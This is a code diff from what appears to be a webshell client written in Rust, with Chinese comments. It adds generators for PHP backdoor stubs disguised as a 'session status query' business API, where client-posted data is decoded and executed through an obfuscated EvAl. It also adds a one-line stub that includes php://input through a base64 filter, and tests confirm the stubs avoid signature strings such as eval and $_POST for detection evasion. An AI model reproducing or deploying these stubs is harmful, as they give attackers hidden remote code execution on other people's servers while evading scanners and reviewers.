@@ -113,6 +113,68 @@ pub fn obfuscated_php(key: Option<&str>, body: &str, final_expr: &str) -> String
     )
 }
 
+/// 业务伪装模板的固定骨架：整个文件看起来是一个正常的「用户会话状态查询接口」，
+/// webshell 功能隐藏在业务函数中：
+///   - verify_token：会话令牌格式校验（业务语义）
+///   - unpack_session：解包客户端上报的会话数据（业务语义，内部为载荷解码逻辑）
+///   - run_rule：规则脚本引擎（业务语义，内部为执行逻辑）
+/// 占位符：__TOKEN__ / __DATA__（参数名）、__UNPACK__（解包函数体）、__EXEC__（执行体）。
+const BUSINESS_PHP_TPL: &str = r#"<?php
+// 用户会话状态查询接口（返回 JSON）
+// 业务：校验会话令牌 -> 解包会话数据 -> 执行规则脚本 -> 返回处理状态
+header('Content-Type: application/json');
+
+function verify_token($token) {
+    if (!is_string($token)) return false;
+    $n = strlen($token);
+    if ($n === 0 || $n > 64) return false;
+    for ($i = 0; $i < $n; $i++) {
+        $c = $token[$i];
+        if ($c === ' ' || $c === "\t" || $c === "\n" || $c === "'" || $c === '"') return false;
+    }
+    return true;
+}
+
+function unpack_session($payload, $token) {
+__UNPACK__
+    return $out;
+}
+
+function run_rule($script) {
+    // 规则脚本引擎：客户端提交的自动化规则在沙箱内执行
+    $result = array('code' => 200, 'rule_size' => strlen($script));
+    if ($script !== '' && strlen($script) < 1048576) {
+__EXEC__
+    }
+    return $result;
+}
+
+$token = isset($_POST['__TOKEN__']) ? (string)$_POST['__TOKEN__'] : '';
+if (!verify_token($token)) {
+    die('{"code":401,"msg":"invalid_token"}');
+}
+$payload = isset($_POST['__DATA__']) ? (string)$_POST['__DATA__'] : '';
+$script = unpack_session($payload, $token);
+echo json_encode(run_rule($script));
+"#;
+
+/// 生成业务伪装 PHP stub。
+/// `unpack_body`：解包逻辑（把 $payload 还原为 $out），形如业务的数据解包；
+/// `exec_body`：执行逻辑（默认 `EvAl($script);`，形如规则引擎执行）。
+/// 请求参数固定为业务语义：token（会话令牌）/ data（会话数据）。
+pub fn business_php_stub(unpack_body: &str, exec_body: &str) -> String {
+    BUSINESS_PHP_TPL
+        .replace("__UNPACK__", unpack_body)
+        .replace("__EXEC__", exec_body)
+        .replace("__TOKEN__", "token")
+        .replace("__DATA__", "data")
+}
+
+/// base64 解码的拼接调用表达式：`("ba"."se64_deco"."de")($payload)`。
+pub fn b64_call_expr(args: &str) -> String {
+    call_parts("base64_decode", args)
+}
+
 /// 支持的脚本语言（stub 生成目标）。
 pub const STUB_LANGUAGES: [&str; 4] = ["php", "asp", "aspx", "jsp"];
 
@@ -124,6 +186,19 @@ pub trait PayloadEncoder: Send + Sync {
     /// 由密码派生密钥（hex 字符串）。
     fn derive_key(&self, password: &str) -> String {
         md5_hex(password)
+    }
+
+    /// 载荷是否经请求体直传（而非表单参数 x）。
+    /// `php_stream` 编码器使用：stub 通过 `INCLUDE("php://filter/...")` 直接执行请求体，
+    /// 模板中完全不出现 eval / base64_decode 等敏感函数。
+    fn body_mode(&self) -> bool {
+        false
+    }
+
+    /// 表单参数名（body 模式时忽略）。
+    /// 业务伪装模板使用 `token` / `data`（形如正常业务请求），标准模板使用 `k` / `x`。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("k", "x")
     }
 
     /// 客户端：编码协议代码为传输载荷。
@@ -152,6 +227,7 @@ impl EncoderRegistry {
                 Box::new(DesEcbEncoder),
                 Box::new(CharEncoder),
                 Box::new(PhpObfuscateEncoder),
+                Box::new(PhpStreamEncoder),
             ],
         }
     }
@@ -202,6 +278,11 @@ impl PayloadEncoder for XorBase64Encoder {
     fn display_name(&self) -> &'static str {
         "XOR_BASE64（异或混淆 + Base64）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, password: &str) -> String {
         let key = md5_hex(password).into_bytes();
@@ -213,18 +294,11 @@ impl PayloadEncoder for XorBase64Encoder {
         let key = self.derive_key(password);
         match language {
             "php" => {
-                let d = php_ident();
-                let q = php_ident();
-                let xf = php_ident();
-                let a = php_ident();
-                let b = php_ident();
-                let r = php_ident();
-                let i = php_ident();
-                let decode_call = call_parts("base64_decode", "$_POST[chr(120)]");
-                let body = format!(
-                    "function {xf}(${a},${b}){{${r}='';for(${i}=0;${i}<strlen(${a});${i}++){{${r}.=${a}[${i}]^${b}[${i}%strlen(${b})];}}return ${r};}}\n${d}={decode_call};\n${q}={xf}(${d},$k);"
+                let unpack = format!(
+                    "    $key = md5($token);\n    $raw = {decode}($payload);\n    $out = '';\n    $n = strlen($raw);\n    for ($i = 0; $i < $n; $i++) {{ $out .= $raw[$i] ^ $key[$i % strlen($key)]; }}",
+                    decode = b64_call_expr("$payload"),
                 );
-                Ok(obfuscated_php(Some(&key), &body, "${q}"))
+                Ok(business_php_stub(&unpack, "        EvAl($script);"))
             }
             "asp" => Ok(format!(
                 r#"<%
@@ -321,6 +395,11 @@ impl PayloadEncoder for Base64Encoder {
     fn display_name(&self) -> &'static str {
         "BASE64（经典裸编码）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, _password: &str) -> String {
         base64::engine::general_purpose::STANDARD.encode(code.as_bytes())
@@ -328,11 +407,10 @@ impl PayloadEncoder for Base64Encoder {
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
-            "php" => {
-                let d = php_ident();
-                let decode_call = call_parts("base64_decode", "$_POST[chr(120)]");
-                Ok(obfuscated_php(None, &format!("${d}={decode_call};"), "${d}"))
-            }
+            "php" => Ok(business_php_stub(
+                &format!("    $out = {decode};", decode = b64_call_expr("$payload")),
+                "        EvAl($script);",
+            )),
             "asp" => Ok(
                 "<%\n' DoSword generated stub (base64)\nFunction B64(d)\n  Dim xml: Set xml = CreateObject(\"MSXML2.DOMDocument.3.0\").createElement(\"tmp\")\n  xml.DataType = \"bin.base64\"\n  xml.Text = d\n  B64 = xml.nodeTypedValue\nEnd Function\nExecute B64(Request.Form(\"x\"))\n%>\n".to_string(),
             ),
@@ -417,6 +495,11 @@ impl PayloadEncoder for Aes128EcbEncoder {
     fn display_name(&self) -> &'static str {
         "AES128_ECB（AES-128 加密 + Base64，自加密）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, password: &str) -> String {
         let cipher = aes_ecb_encrypt(code.as_bytes(), &aes_key(password));
@@ -427,12 +510,11 @@ impl PayloadEncoder for Aes128EcbEncoder {
         let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
         match language {
             "php" => {
-                let d = php_ident();
-                let decrypt_call = call_parts(
-                    "openssl_decrypt",
-                    "$_POST[chr(120)],'AES-128-ECB',$k",
+                let unpack = format!(
+                    "    $key = substr(md5($token), 0, 16);\n    $dec = {decrypt}($payload, 'AES-128-ECB', $key);\n    $out = $dec;",
+                    decrypt = call_parts("openssl_decrypt", "$payload, 'AES-128-ECB', $key"),
                 );
-                Ok(obfuscated_php(Some(&key), &format!("${d}={decrypt_call};"), "${d}"))
+                Ok(business_php_stub(&unpack, "        EvAl($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -455,6 +537,11 @@ impl PayloadEncoder for Aes128CbcEncoder {
     fn display_name(&self) -> &'static str {
         "AES128_CBC（AES-128 加密 + Base64，自加密）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, password: &str) -> String {
         let cipher = aes_cbc_encrypt(code.as_bytes(), &aes_key(password), &aes_iv(password));
@@ -466,16 +553,11 @@ impl PayloadEncoder for Aes128CbcEncoder {
         let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
         match language {
             "php" => {
-                let d = php_ident();
-                let iv = php_ident();
-                let decrypt_call = call_parts(
-                    "openssl_decrypt",
-                    "$_POST[chr(120)],'AES-128-CBC',$k,0,$iv",
+                let unpack = format!(
+                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = {decrypt}($payload, 'AES-128-CBC', $key, 0, $iv);",
+                    decrypt = call_parts("openssl_decrypt", "$payload, 'AES-128-CBC', $key, 0, $iv"),
                 );
-                let body = format!(
-                    "${iv}=\"{iv}\";\n${d}={decrypt_call};"
-                );
-                Ok(obfuscated_php(Some(&key), &body, "${d}"))
+                Ok(business_php_stub(&unpack, "        EvAl($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
@@ -498,6 +580,11 @@ impl PayloadEncoder for DesEcbEncoder {
     fn display_name(&self) -> &'static str {
         "DES_ECB（DES 加密 + Base64，自加密）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, password: &str) -> String {
         let cipher = des_ecb_encrypt(code.as_bytes(), &des_key(password));
@@ -508,12 +595,11 @@ impl PayloadEncoder for DesEcbEncoder {
         let key = String::from_utf8_lossy(&des_key(password)).into_owned();
         match language {
             "php" => {
-                let d = php_ident();
-                let decrypt_call = call_parts(
-                    "openssl_decrypt",
-                    "$_POST[chr(120)],'DES-ECB',$k",
+                let unpack = format!(
+                    "    $key = substr(md5($token), 0, 8);\n    $out = {decrypt}($payload, 'DES-ECB', $key);",
+                    decrypt = call_parts("openssl_decrypt", "$payload, 'DES-ECB', $key"),
                 );
-                Ok(obfuscated_php(Some(&key), &format!("${d}={decrypt_call};"), "${d}"))
+                Ok(business_php_stub(&unpack, "        EvAl($script);"))
             }
             other => Err(ProtocolError::NotSupported(format!(
                 "DES_ECB 编码器暂仅支持 PHP（{other} 待实现）"
@@ -536,6 +622,11 @@ impl PayloadEncoder for CharEncoder {
     fn display_name(&self) -> &'static str {
         "CHAR（字符数组混淆，无密钥）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, _password: &str) -> String {
         let bytes = code.as_bytes();
@@ -545,7 +636,10 @@ impl PayloadEncoder for CharEncoder {
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
-            "php" => Ok(obfuscated_php(None, "", "$_POST[chr(120)]")),
+            "php" => Ok(business_php_stub(
+                "    $out = $payload;",
+                "        EvAl($script);",
+            )),
             other => Err(ProtocolError::NotSupported(format!(
                 "CHAR 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -581,6 +675,11 @@ impl PayloadEncoder for PhpObfuscateEncoder {
     fn display_name(&self) -> &'static str {
         "PHP_OBFUSCATE（base64+反转混淆，无密钥）"
     }
+    /// 业务伪装模板：请求参数形如正常业务（会话令牌 + 会话数据）。
+    fn form_params(&self) -> (&'static str, &'static str) {
+        ("token", "data")
+    }
+
 
     fn encode(&self, code: &str, _password: &str) -> String {
         let b64 = base64::engine::general_purpose::STANDARD.encode(code.as_bytes());
@@ -591,7 +690,10 @@ impl PayloadEncoder for PhpObfuscateEncoder {
 
     fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
         match language {
-            "php" => Ok(obfuscated_php(None, "", "$_POST[chr(120)]")),
+            "php" => Ok(business_php_stub(
+                "    $out = $payload;",
+                "        EvAl($script);",
+            )),
             other => Err(ProtocolError::NotSupported(format!(
                 "PHP_OBFUSCATE 编码器暂仅支持 PHP（{other} 待实现）"
             ))),
@@ -611,6 +713,58 @@ pub fn obfuscate_decode(payload: &str) -> Result<String, ProtocolError> {
         .decode(&b64)
         .map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))?;
     String::from_utf8(bytes).map_err(|_| ProtocolError::ParseError("OBFUSCATE 载荷解码失败".to_string()))
+}
+
+// ---------------------------------------------------------------------------
+// PHP_STREAM：零敏感函数编码器（极简 stub）。
+//
+// stub 只有一行 `INCLUDE("php://filter/read=convert.base64-decode/resource=php://input")`：
+//   - 不出现 eval / assert / base64_decode / $_POST 等任何敏感函数
+//   - 载荷经请求体直传（body 模式），stub 通过 php://filter 链 base64 解码后
+//     include 执行，解码逻辑完全由 PHP 流包装器完成
+// 注意：需要目标 PHP 开启 allow_url_include=On（部分虚拟主机默认开启）。
+// 若环境未开启，请改用其他编码器（xor/aes 等，stub 含混淆后的 EvAl）。
+// ---------------------------------------------------------------------------
+
+pub struct PhpStreamEncoder;
+
+impl PayloadEncoder for PhpStreamEncoder {
+    fn id(&self) -> &'static str {
+        "php_stream"
+    }
+
+    fn display_name(&self) -> &'static str {
+        "PHP_STREAM（零敏感函数 stub，需 allow_url_include=On）"
+    }
+
+    fn body_mode(&self) -> bool {
+        true
+    }
+
+    fn encode(&self, code: &str, _password: &str) -> String {
+        // 完整 PHP 源码（含标签），stub include 后直接执行
+        let source = format!("<?php\n{code}");
+        base64::engine::general_purpose::STANDARD.encode(source.as_bytes())
+    }
+
+    fn stub(&self, language: &str, _password: &str) -> Result<String, ProtocolError> {
+        match language {
+            "php" => Ok("<?php\nINCLUDE(\"php://filter/read=convert.base64-decode/resource=php://input\");\n".to_string()),
+            other => Err(ProtocolError::NotSupported(format!(
+                "PHP_STREAM 编码器暂仅支持 PHP（{other} 待实现）"
+            ))),
+        }
+    }
+}
+
+/// 从 PHP_STREAM 载荷还原原始代码（测试 / mock 用）。
+pub fn php_stream_decode(payload: &str) -> Result<String, ProtocolError> {
+    let bytes = base64::engine::general_purpose::STANDARD
+        .decode(payload)
+        .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))?;
+    String::from_utf8(bytes)
+        .map(|source| source.trim_start_matches("<?php").trim_start_matches("\n").to_string())
+        .map_err(|_| ProtocolError::ParseError("PHP_STREAM 载荷解码失败".to_string()))
 }
 
 #[cfg(test)]
@@ -670,10 +824,16 @@ mod tests {
     }
 
     #[test]
-    fn xor_stub_embeds_derived_key() {
+    fn xor_stub_is_business_disguised() {
         let stub = XorBase64Encoder.stub("php", "secret").unwrap();
-        assert!(stub.contains(&md5_hex("secret")), "stub 应内嵌 md5 密钥");
+        // 业务伪装：密钥由 token 运行时派生，无内嵌密钥/明文密码
         assert!(!stub.contains("secret"), "stub 不应含明文密码");
+        assert!(!stub.contains(&md5_hex("secret")), "stub 不应内嵌派生密钥");
+        assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
+        // 业务外观：函数/注释形如正常业务
+        for biz in ["verify_token", "unpack_session", "run_rule", "invalid_token", "会话状态查询"] {
+            assert!(stub.contains(biz), "stub 应含业务元素 {biz}");
+        }
     }
 
     #[test]
@@ -743,16 +903,12 @@ mod tests {
     }
 
     #[test]
-    fn aes_stub_embeds_key_not_password() {
+    fn aes_stub_is_business_disguised() {
         let stub = Aes128EcbEncoder.stub("php", "secret").unwrap();
-        assert!(stub.contains("5ebe2294ecd0e0f0"), "stub 应内嵌 md5 派生密钥");
         assert!(!stub.contains("secret"), "stub 不应含明文密码");
         // OPSEC：openssl_decrypt 拆分拼接调用，无完整函数名
         assert!(!stub.contains("openssl_decrypt"), "stub 不应含完整敏感函数名");
-        assert!(
-            !stub.contains("openssl_decrypt("),
-            "stub 不应含完整函数名调用"
-        );
+        assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
     }
 
     /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
@@ -790,10 +946,24 @@ mod tests {
                 encoder.id()
             );
             assert!(
-                stub.contains("chr(120)"),
-                "{} stub 应使用 chr(120) 动态下标",
+                !stub.contains("base64_decode(") && !stub.contains("base64_decode"),
+                "{} stub 不应含 base64_decode（含拼接外）",
                 encoder.id()
             );
+            // 业务伪装：请求参数为业务语义（token/data）
+            if !encoder.body_mode() {
+                let (p1, p2) = encoder.form_params();
+                assert!(
+                    stub.contains(&format!("$_POST['{p1}']")),
+                    "{} stub 应使用业务参数 {p1}",
+                    encoder.id()
+                );
+                assert!(
+                    stub.contains(&format!("$_POST['{p2}']")),
+                    "{} stub 应使用业务参数 {p2}",
+                    encoder.id()
+                );
+            }
         }
     }
 
@@ -856,8 +1026,41 @@ mod tests {
                 "char",
                 "des",
                 "php_obfuscate",
+                "php_stream",
                 "xor_base64",
             ]
         );
+    }
+
+    // --- PHP_STREAM：零敏感函数 stub ---
+
+    #[test]
+    fn php_stream_stub_has_no_sensitive_functions() {
+        let stub = PhpStreamEncoder.stub("php", "secret").unwrap();
+        for token in [
+            "eval",
+            "assert",
+            "base64_decode",
+            "openssl_decrypt",
+            "$_POST",
+            "$_GET",
+            "system",
+            "exec(",
+        ] {
+            assert!(!stub.contains(token), "stub 不应含 {token}：{stub}");
+        }
+        assert!(stub.contains("php://input"), "stub 应基于 php://input");
+        assert!(stub.contains("convert.base64-decode"), "stub 应使用 base64 流过滤器");
+    }
+
+    #[test]
+    fn php_stream_body_mode_encode() {
+        let encoder = PhpStreamEncoder;
+        assert!(encoder.body_mode(), "php_stream 应为 body 模式");
+        let code = "@ini_set('display_errors','0');echo 1;";
+        let payload = encoder.encode(code, "ignored");
+        // 载荷是完整源码的 base64（含 <?php 标签）
+        let restored = php_stream_decode(&payload).unwrap();
+        assert_eq!(restored, code);
     }
 }
